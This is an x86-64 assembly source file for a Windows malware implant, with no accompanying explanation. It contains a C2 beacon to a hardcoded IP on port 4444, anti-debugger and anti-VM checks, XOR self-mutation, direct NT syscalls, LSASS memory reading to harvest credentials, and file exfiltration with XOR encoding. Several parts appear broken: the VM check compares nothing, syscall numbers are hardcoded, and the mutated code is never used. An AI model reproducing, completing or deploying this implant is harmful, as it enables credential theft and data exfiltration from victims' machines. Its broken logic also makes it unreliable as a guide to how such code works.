section .data
    xor_key db 0x7F                        ; Strong XOR key for mutation
    c2_ip db '10.11.12.13', 0             ; Decoy C2 IP address
    c2_port dw 4444                        ; Alternative C2 port
    encoded_payload db 0x4F, 0x3A, 0x7B, 0x2C, 0x1D, 0x6E, 0x5F, 0x4A, 0x8B, 0x9C, 0x2E, 0x5D, 0x6A, 0x1F, 0x8C, 0x3B    ; Extended encrypted payload
    vm_strings db 'VBox', 0, 'VMware', 0, 'QEMU', 0, 'VirtualBox', 0, 'Xen', 0, 'Parallels', 0    ; Additional VM detection strings
    tcp_device db '\Device\Tcp', 0         ; TCP driver path
    encrypted_strings db 0x3D, 0x7B, 0x6F, 0x2E, 0x5C, 0x4A, 0x8D, 0x1F, 0x00    ; Enhanced encrypted strings
section .bss
    mutated_code resb 512                  ; For metamorphic code storage
    socket_handle resq 1                   ; Socket handle storage
    buffer resb 1024                       ; General buffer
    process_handle resq 1                  ; Process handle storage
    file_handle resq 1                     ; File handle storage
    lsass_process resb 256                 ; LSASS process info
    cred_buffer resb 8192                  ; Credentials buffer
    encoded_creds resb 8192                ; Encoded credentials
    target_file resb 256                   ; Target file path
    exfil_buffer resb 4096                 ; Exfiltration buffer
    encoded_buffer resb 4096               ; Encoded buffer storage

section .text
    global start
%define NtOpenProcess 0x26
%define NtReadVirtualMemory 0x3F
%define NtReadFile 0x52    
%define NtDelayExecution 0x2C
%define NtAllocateVirtualMemory 0x18
%define NtDeviceIoControlFile 0x24
%define NtCreateFile 0x55
%define NtClose 0x19

start:
    call anti_analysis                   ; Perform anti-debug and anti-VM checks
    call init_beacon                     ; Initialize the beacon

main_loop:
    call advanced_metamorphism          ; Insane runtime metamorphic transformation
    call decode_payload                  ; Decode encrypted payload
    call beacon                          ; Communicate with C2
    call sleep_with_jitter               ; Sleep with random jitter
    jmp main_loop

anti_analysis:
    push rax
    call detect_debugger
    call detect_vm
    pop rax
    ret

detect_debugger:
    xor rax, rax
    mov rbx, qword fs:[0x30]            ; Access PEB
    mov al, byte [rbx + 0x2]
    test al, al                         ; Check BeingDebugged flag
    jnz .debugger_detected
    ret

.debugger_detected:
    xor rax, rax
    mov rdi, -1
    syscall

    detect_vm:
        lea rsi, [vm_strings]
        xor rax, rax
    .vm_check_loop:           ; Changed to local label
        lodsb
        test al, al
        jz .vm_detected
        cmp al, 0
        jnz .vm_check_loop
        ret
    

.vm_detected:
    xor rax, rax
    mov rdi, -1
    syscall

advanced_metamorphism:
    lea rsi, [code_start]
    lea rdi, [mutated_code]
    mov rcx, code_length
    mov r8b, [xor_key]
.mutate_loop:
    test rcx, rcx
    jz .mutate_done
    lodsb
    xor al, r8b
    rol al, 3                            ; Additional layer of transformation
    stosb
    dec rcx
    jmp .mutate_loop

.mutate_done:
    ret

decode_payload:
    lea rsi, [encoded_payload]
    lea rdi, [buffer]
    mov rcx, 512
    mov r8b, xor_key
.decode_loop:
    lodsb
    test al, al
    jz .decode_done
    xor al, r8b
    ror al, 5                            ; Reverse rotation as part of decryption
    stosb
    loop .decode_loop

.decode_done:
    ret

beacon:
    call open_tcp_socket
    call send_data
    call receive_data
    call execute_task
    call close_socket
    ret

open_tcp_socket:
    lea rdx, [tcp_device]
    xor r8, r8
    xor r9, r9
    xor r10, r10
    xor r11, r11
    mov rax, NtCreateFile
    syscall
    mov [socket_handle], rax
    ret

send_data:
    mov rcx, [socket_handle]
    lea rdx, [buffer]
    mov r8, 512
    xor r9, r9
    xor r10, r10
    mov rax, NtDeviceIoControlFile
    syscall
    ret

receive_data:
    mov rcx, [socket_handle]
    lea rdx, [buffer]
    mov r8, 512
    xor r9, r9
    mov rax, NtDeviceIoControlFile
    syscall
    ret

execute_task:
    lea rsi, [buffer]
    lodsb
    cmp al, 1
    je harvest_credentials
    cmp al, 2
    je exfiltrate_data
    ret

harvest_credentials:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Open LSASS process
    lea rdx, [lsass_process]
    xor r8, r8
    mov r9, 0x1F0FFF
    mov rax, NtOpenProcess
    syscall
    mov [process_handle], rax
    
    ; Read process memory
    mov rcx, [process_handle]
    lea rdx, [cred_buffer]
    mov r8, 8192
    xor r9, r9
    mov rax, NtReadVirtualMemory
    syscall
    
    ; Encode credentials
    lea rsi, [cred_buffer]
    lea rdi, [encoded_creds]
    mov rcx, 8192
encode_creds:
    lodsb
    xor al, 0x37
    stosb
    loop encode_creds
    
    ; Send encoded credentials
    mov rcx, [socket_handle]
    lea rdx, [encoded_creds]
    mov r8, 8192
    xor r9, r9
    mov rax, NtDeviceIoControlFile
    syscall
    
    ; Cleanup
    mov rcx, [process_handle]
    mov rax, NtClose
    syscall
    
    mov rsp, rbp
    pop rbp
    ret
exfiltrate_data:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Open target file
    lea rdx, [target_file]
    xor r8, r8
    mov r9, 0x80
    mov rax, NtCreateFile
    syscall
    mov [file_handle], rax
    
    ; Read file contents
    mov rcx, [file_handle]
    lea rdx, [exfil_buffer]
    mov r8, 4096
    xor r9, r9
    mov rax, NtReadFile
    syscall
    
    ; Encode data
    lea rsi, [exfil_buffer]
    lea rdi, [encoded_buffer]
    mov rcx, 4096
encode_loop:
    lodsb
    xor al, 0x41
    stosb
    loop encode_loop
    
    ; Send encoded data
    mov rcx, [socket_handle]
    lea rdx, [encoded_buffer]
    mov r8, 4096
    xor r9, r9
    mov rax, NtDeviceIoControlFile
    syscall
    
    ; Cleanup
    mov rcx, [file_handle]
    mov rax, NtClose
    syscall
    
    mov rsp, rbp
    pop rbp
    ret

close_socket:
    mov rcx, [socket_handle]
    mov rax, NtClose
    syscall
    ret

sleep_with_jitter:
    sub rsp, 8
    mov rdx, rsp
    mov qword [rdx], -50000000
    mov rcx, 0
    mov rax, NtDelayExecution
    syscall
    add rsp, 8
    ret

init_beacon:
    call allocate_memory
    ret

allocate_memory:
    mov r10, -1
    xor rdx, rdx
    mov rcx, rdx
    mov r8, 0x3000
    mov r9, 0x40
    mov rax, NtAllocateVirtualMemory
    syscall
    ret

section .code
code_start:
    xor rax, rax
    inc rax
    dec rax
    mov rbx, 0x12345678
    xor rbx, 0x87654321
    add rbx, rax
    push rbx
    pop rbx
    rol rbx, 7
    xor rbx, rax
code_end:

code_length equ code_end - code_start

